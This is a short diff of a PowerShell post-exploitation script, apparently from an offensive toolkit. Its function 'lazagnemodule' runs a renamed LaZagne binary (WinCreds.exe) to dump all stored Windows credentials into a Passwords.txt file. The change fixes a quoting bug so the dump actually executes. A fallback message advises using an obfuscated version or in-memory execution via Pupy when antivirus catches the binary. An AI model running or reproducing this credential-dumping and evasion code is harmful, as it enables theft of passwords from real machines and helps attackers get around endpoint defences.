@@ -1322,7 +1322,7 @@ function lazagnemodule
     {
         Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
 	mkdir $currentPath\Lazagne
-        "$currentPath\WinCreds.exe all" >> $currentPath\Lazagne\Passwords.txt
+        $currentPath\WinCreds.exe all >> $currentPath\Lazagne\Passwords.txt
         Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
     }
     else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
